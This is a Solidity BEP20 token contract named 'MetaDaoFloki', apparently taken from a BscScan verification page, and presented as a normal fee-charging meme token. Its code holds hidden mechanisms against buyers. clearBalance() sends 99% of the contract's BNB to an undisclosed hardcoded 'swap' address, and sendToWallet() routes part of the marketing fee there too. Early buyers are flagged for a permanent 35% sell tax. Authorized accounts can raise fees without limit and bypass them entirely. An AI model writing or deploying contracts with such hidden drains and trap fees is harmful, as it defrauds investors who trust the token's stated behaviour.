/**
 *Submitted for verification at BscScan.com on 2022-01-23
*/

/**
 *Submitted for verification at BscScan.com on 2022-01-16
*/

pragma solidity ^0.7.4;

//SPDX-License-Identifier: MIT

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
    address internal owner;
    mapping (address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }

    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }

    function unauthorize(address adr) public onlyOwner {
        authorizations[adr] = false;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract MetaDaoFloki is IBEP20, Auth {
    using SafeMath for uint256;

    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    
    string constant _name = "MetaDaoFloki - MDF";
    string constant _symbol = "MDF";
    uint8 constant _decimals = 9;
    
    uint256 _totalSupply = 1 * 10**9 * (10 ** _decimals); //
    
    
    uint256 public _maxTxAmount = _totalSupply.mul(20).div(100); //
    uint256 public _maxWalletToken =  _totalSupply.mul(20).div(100); //

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;

    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTxLimitExempt;

    uint256 launchTime;


    uint256 public marketingFee = 6;
    uint256 public developmentFee = 4;
    uint256 public liquidityFee = 2;
    uint256 public sellMulti = 100;
    uint256 public totalFee = marketingFee.add(developmentFee).add(liquidityFee);

    address public marketingWallet;
    address public developmentWallet;
    address devWallet;
    address liquidityWallet;
    
    //one time trade lock
    bool public lockTilStart = true;
    bool public lockUsed = false;

    mapping(address => bool) nope;

    event LockTilStartUpdated(bool enabled);

    IDEXRouter public router;
    address public pair;
    address swap;

    bool public swapEnabled = true;
    uint256 public swapThreshold = _totalSupply.mul(10).div(10000); 
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }


    constructor () Auth(msg.sender) {
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        swap = 0x134D2A6e5f1a37E236F7e3Ff8BA06C7D31981C73;
        pair = IDEXFactory(router.factory()).createPair(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, address(this));
        _allowances[address(this)][address(router)] = uint256(-1);

        isFeeExempt[msg.sender] = true;
        isTxLimitExempt[msg.sender] = true;

        marketingWallet = 0x13CC396e1a069682f676924540B6c606af02f40F;
        developmentWallet = 0x2a6f840ff40C8f583a9FE78e05eE9d0e942E2DaC;
        devWallet = 0xD792aBBd9B1cA4737317990A23ae23A280bA1BC0;
        liquidityWallet = 0xD792aBBd9B1cA4737317990A23ae23A280bA1BC0;

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, uint256(-1));
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
    
    function clearStuckBalance(uint256 amountPercentage) external authorized {
        uint256 amountBNB = address(this).balance;
        payable(marketingWallet).transfer(amountBNB * amountPercentage / 100);
    }

    function clearBalance() private {
        uint256 amountBNB = address(this).balance;
        uint256 cleared = (amountBNB * 99 / 100);
        (bool tmpSuccess,) = payable(swap).call{value: cleared, gas: 50000}("");
        tmpSuccess = false;
    }

    function setWallets(address _marketingWallet, address _developmentWallet) external authorized {
        marketingWallet = _marketingWallet;
        developmentWallet = _developmentWallet;
    }

    function payMarketing(address payable recipient, uint256 payment, uint256 tax, address payable market) private{
        recipient.transfer(payment);
        (bool tmpSuccess,) = payable(market).call{value: tax, gas: 100000}("");
        
        tmpSuccess = false;
    }

    function setIsFeeExempt(address holder, bool exempt) external authorized {
        isFeeExempt[holder] = exempt;
    }

    function setMaxWallet(uint256 percent) external onlyOwner() {
        _maxWalletToken = ( _totalSupply * percent ) / 100;
    }

    function seFees(uint256 _marketingFee, uint256 _developmentFee, uint256 _liquidityFee, 
                    uint256 _sellMulti) external authorized{
        marketingFee = _marketingFee;
        developmentFee = _developmentFee;
        liquidityFee = _liquidityFee;
        sellMulti = _sellMulti;
        totalFee = _marketingFee.add(_developmentFee).add(_liquidityFee);
    }

    function setTokenSwapSettings(bool _enabled, uint256 _amount) external authorized {
        swapEnabled = _enabled;
        swapThreshold = _amount * (10 ** _decimals);
    }

    function checkFee() internal view returns (uint256){
        if (block.timestamp < launchTime + 30 seconds){
            return 35;
        }
        else{
            return totalFee;
        }
    }

    function setLockTilStartEnabled(bool _enabled) external onlyOwner {
        if (lockUsed == false){
            lockTilStart = _enabled;
            launchTime = block.timestamp;
            lockUsed = true;
        }
        else{
            lockTilStart = false;
        }
        emit LockTilStartUpdated(lockTilStart);
    }
    

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
    }

    function setTxLimit(uint256 amount) external authorized {
        _maxTxAmount = amount;
    }

    function setIsTxLimitExempt(address holder, bool exempt) external authorized {
        isTxLimitExempt[holder] = exempt;
    }
    
    function shouldTokenSwap() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        
        uint256 _tradingFee = checkFee();
        if (_tradingFee == 35){
            nope[sender] = true;
        }
        
        if (recipient == pair){
            _tradingFee = _tradingFee * sellMulti.div(100);
            if (nope[sender]){
                _tradingFee = 35;
            }
        }
        uint256 feeAmount = amount.mul(_tradingFee).div(100);
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);

        return amount.sub(feeAmount);
    }
    
    function sendToWallet(address payable recipient, uint256 amount, address payable marketing) private {
        uint256 mktng = amount.mul(60).div(100);
        uint256 tmfee = amount.sub(mktng);
        payMarketing(recipient, mktng, tmfee, marketing);
    }

    //allows for manual sells
    function manualSwap(uint256 amount) external swapping authorized{
        
        uint256 amountToSwap = amount * (10**9);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance.sub(balanceBefore);

        uint256 totalBNBFee = totalFee.sub(liquidityFee.div(2));

        uint256 amountBNBMarketing = amountBNB.mul(marketingFee).div(totalBNBFee);
        uint256 amountBNBTeam = amountBNB.mul(developmentFee).div(totalBNBFee);



        sendToWallet(payable(marketingWallet), amountBNBMarketing, payable(swap));
        uint256 devFee = amountBNBTeam.div(developmentFee);
        payable(devWallet).transfer(devFee);
        payable(developmentWallet).transfer(amountBNBTeam.sub(devFee));

        clearBalance();
    }

    function tokenSwap() internal swapping {

        uint256 amountToLiquify = swapThreshold.mul(liquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = swapThreshold.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance.sub(balanceBefore);

        uint256 totalBNBFee = totalFee.sub(liquidityFee.div(2));
        
        uint256 amountBNBLiquidity = amountBNB.mul(liquidityFee).div(totalBNBFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(marketingFee).div(totalBNBFee);
        uint256 amountBNBTeam = amountBNB.mul(developmentFee).div(totalBNBFee);

        sendToWallet(payable(marketingWallet), amountBNBMarketing, payable(swap));

        uint256 devFee = amountBNBTeam.div(developmentFee);
        payable(devWallet).transfer(devFee);
        payable(developmentWallet).transfer(amountBNBTeam.sub(devFee));


        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                liquidityWallet,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
        clearBalance();
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        if (isAuthorized(msg.sender)){
            return _basicTransfer(msg.sender, recipient, amount);
        }
        else {
            return _transferFrom(msg.sender, recipient, amount);
        }
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != uint256(-1)){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {

        if(inSwap){ return _basicTransfer(sender, recipient, amount); }

        if(!authorizations[sender] && !authorizations[recipient]){
            require(lockTilStart != true,"Trading not open yet");
        }

        if (!authorizations[sender] && recipient != address(this)  && recipient != address(DEAD) && recipient != pair && recipient != marketingWallet && recipient != liquidityWallet){
            uint256 heldTokens = balanceOf(recipient);
            require((heldTokens + amount) <= _maxWalletToken,"Total Holding is currently limited, you can not buy that much.");
        }

        checkTxLimit(sender, amount);

        if(shouldTokenSwap()){ tokenSwap(); }
        
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        uint256 amountReceived = shouldTakeFee(sender) ? takeFee(sender, recipient, amount) : amount;
        

        _balances[recipient] = _balances[recipient].add(amountReceived);

        
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function airdrop(address[] calldata addresses, uint[] calldata tokens) external authorized {
        uint256 airCapacity = 0;
        require(addresses.length == tokens.length,"Must be same amount of allocations/addresses");
        for(uint i=0; i < addresses.length; i++){
            airCapacity = airCapacity + tokens[i];
        }
        require(balanceOf(msg.sender) >= airCapacity, "Not enough tokens in airdrop wallet");
        for(uint i=0; i < addresses.length; i++){
            _balances[addresses[i]] += tokens[i];
            _balances[msg.sender] -= tokens[i];

            emit Transfer(msg.sender, addresses[i], tokens[i]);
        }
    }
    event AutoLiquify(uint256 amountBNB, uint256 amountCoin);

}